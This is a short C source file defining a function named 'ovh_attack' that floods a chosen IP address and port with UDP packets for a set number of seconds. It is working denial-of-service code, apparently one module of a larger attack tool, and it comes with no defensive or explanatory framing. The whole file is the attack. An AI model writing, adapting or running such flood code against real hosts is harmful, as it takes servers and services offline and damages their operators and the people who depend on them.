#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>

void ovh_attack(const char *target_ip, int port, int duration) {
    printf("[C] Starting OVH UDP Flood on %s:%d for %d seconds\n", target_ip, port, duration);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("[C] Socket failed");
        return;
    }

    struct sockaddr_in victim;
    memset(&victim, 0, sizeof(victim));
    victim.sin_family = AF_INET;
    victim.sin_port = htons(port);
    victim.sin_addr.s_addr = inet_addr(target_ip);

    char payload[1024];
    memset(payload, 'X', sizeof(payload)); // Filler packet

    time_t end = time(NULL) + duration;

    while (time(NULL) < end) {
        sendto(sock, payload, sizeof(payload), 0,
               (struct sockaddr *)&victim, sizeof(victim));
        usleep(100); // prevent CPU lock
    }

    close(sock);
    printf("[C] OVH attack finished\n");
}
